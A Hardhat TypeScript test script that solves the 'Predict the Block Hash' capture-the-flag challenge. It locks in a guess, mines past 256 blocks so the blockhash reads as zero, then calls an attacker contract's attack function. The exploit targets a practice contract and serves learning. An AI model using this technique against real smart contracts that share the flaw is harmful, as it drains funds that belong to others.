import { ethers } from 'hardhat';
import { Contract, Signer } from 'ethers';

let accounts: Signer[];
let eoa: Signer;
let contract: Contract;
let attacker: Contract;

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const challengeFactory = await ethers.getContractFactory('PredictTheBlockHashChallenge');
  contract = challengeFactory.attach(`0x5AEfAA64A2454D1F40b53613CC573bF2fc9F7777`);

  const attackerFactory = await ethers.getContractFactory('PredictTheBlockHashChallengeHack');
  attacker = attackerFactory.attach(`0xfD49DeFDdf9743e2fC886277281A570e27347f25`);
});

it('Attack!!', async function () {
    console.log(`ATTACK CONTRACT :: ${attacker.address}`);
    await attacker.callLockInGuess(
        {
          value: ethers.utils.parseEther(`1`),
        }
      );

    while (await attacker.amountBlock() < 257) {
        await attacker.mineBlock();
    }

    await attacker.attack()

    console.log(contract.isComplete());

});
